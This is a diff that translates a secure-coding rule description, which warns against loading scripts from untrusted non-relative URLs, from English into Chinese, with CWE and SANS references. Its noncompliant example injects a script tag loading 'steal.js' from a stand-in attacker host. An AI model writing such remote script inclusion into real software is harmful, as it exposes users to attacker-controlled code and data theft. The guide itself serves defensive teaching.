@@ -1,6 +1,5 @@
-<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this
-rule raises an issue for each non-relative URL.</p>
-<h2>Noncompliant Code Example</h2>
+<p>在站点中包含来自不可信源的内容可能会将用户暴露给攻击者，甚至危及您自己的站点。因此，该规则为每个非相对URL提出了一个问题。</p>
+<h2>不合规的代码示例</h2>
 <pre>
 function include(url) {
   var s = document.createElement("script");
@@ -8,12 +7,12 @@ function include(url) {
   s.setAttribute("src", url);
   document.body.appendChild(s);
 }
-include("http://hackers.com/steal.js")  // Noncompliant
+include("http://hackers.com/steal.js")  // 不合规
 </pre>
-<h2>See</h2>
+<h2>请参阅</h2>
 <ul>
-  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
   <li> <a href="http://cwe.mitre.org/data/definitions/829">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
+  <li> OWASP Top 10 2017 Category A1 - Injection </li>
   <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
 </ul>
 
